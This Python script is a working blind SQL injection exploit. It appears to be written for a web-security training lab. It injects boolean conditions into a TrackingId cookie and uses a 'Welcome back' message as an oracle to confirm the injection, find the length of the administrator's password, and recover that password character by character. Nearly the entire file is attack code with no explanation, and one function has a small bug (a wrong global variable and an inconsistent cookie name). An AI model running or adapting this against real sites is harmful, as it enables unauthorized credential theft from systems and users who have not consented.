# import re
import sys
import urllib.parse

import requests
import urllib3
# from bs4 import BeautifulSoup
from colorama import Fore
from requests.exceptions import RequestException

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

USER_NAME = "administrator"
TABLE_NAME = "users"
COLUMN_NAME = "username"


def solve_password(base_url, cookies, password_length):
    password_extracted = ""
    for i in range(1, password_length + 1):
        for j in range(32, 126):
            sqli_payload = f"' and (select ascii(substring(password,{i},1)) from {TABLE_NAME} WHERE {COLUMN_NAME}='{USER_NAME}')='{j}'--'"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            tack_cook = cookies.get("TrackingId")
            sess_cook = cookies.get("session")
            if tack_cook is None or sess_cook is None:
                print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
                sys.exit(0)
            cookie = {
                "TrackingId": tack_cook + sqli_payload_encoded,
                "SessionId": sess_cook,
            }
            r = requests.get(
                base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
            )
            r.raise_for_status()
            if "Welcome back" not in r.text:
                print(
                    f"[-] Password: {Fore.YELLOW}{password_extracted}{Fore.RESET} - Testing: {Fore.YELLOW}{chr(j)}{Fore.RESET}"
                )
            else:
                password_extracted += chr(j)
                print(
                    f"{Fore.YELLOW}[-] Password: {password_extracted} and is {len(password_extracted)}long. {Fore.RESET}"
                )
                break

    return password_extracted

def find_password_length(base_url, cookies):
    password_length = 0
    for i in range(1, 50):
        sqli_payload = f"' and (select {COLUMN_NAME} FROM {TABLE_NAME} WHERE {COLUMN_NAME}='{USER_NAME}' and LENGTH(password)>{i})='{USER_NAME}'--'"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        tack_cook = cookies.get("TrackingId")
        sess_cook = cookies.get("session")
        if tack_cook is None or sess_cook is None:
            print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
            sys.exit(0)
        cookie = {
            "TrackingId": tack_cook + sqli_payload_encoded,
            "session": sess_cook,
        }
        r = requests.get(
            base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
        )
        r.raise_for_status()
        if "Welcome back" not in r.text:
            password_length = i
            break

    return password_length

def check_if_sqli_possible(base_url, cookies):
    sqli_true = "' and 1=1--'"
    sqli_false = "' and 1=2--'"
    sqli_true_encoded = urllib.parse.quote(sqli_true)
    sqli_false_encoded = urllib.parse.quote(sqli_false)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sqli_true_encoded,
        "session": sess_cook,
    }
    r = requests.get(
        base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
    )
    r.raise_for_status()
    if "Welcome back" not in r.text:
        print(f"{Fore.RED}[-] Sqli is NOT possible {Fore.RESET}")
        return False
    cookie = {
        "TrackingId": tack_cook + sqli_false_encoded,
        "session": sess_cook,
    }
    r = requests.get(
        base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
    )
    r.raise_for_status()
    if "Welcome back" in r.text:
        print(f"{Fore.RED}[-] Sqli is NOT possible {Fore.RESET}")
        return False
    return True

def get_cookies_from_url(base_url):
    try:
        r = requests.get(base_url, proxies=proxies, verify=False, timeout=5)
        if r.status_code == 200:
            cookies = {
                "TrackingId": r.cookies.get("TrackingId"),
                "session": r.cookies.get("session"),
            }
            return cookies

        print(f"HTTP GET request failed with status code: {r.status_code}")
        return None
    except RequestException as e:
        print(f"An error occurred: {str(e)}")
        return None

def exploit(base_url):
    cookies = get_cookies_from_url(base_url) 
    print(f"{Fore.GREEN}[+] Cookies: {cookies}{Fore.RESET}")
    possible = check_if_sqli_possible(base_url, cookies)
    if not possible:
        return
    print(f"{Fore.GREEN}[-] Sqli is possible{Fore.RESET}")
    pwd_length = find_password_length(base_url, cookies)
    print(f"{Fore.GREEN}[-] Password length =  {pwd_length}{Fore.RESET}")
    if pwd_length > 0:
        final_password = solve_password(url, cookies, pwd_length)
        print(f"{Fore.RED}The password is: {final_password}{Fore.RESET}")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    exploit(url)
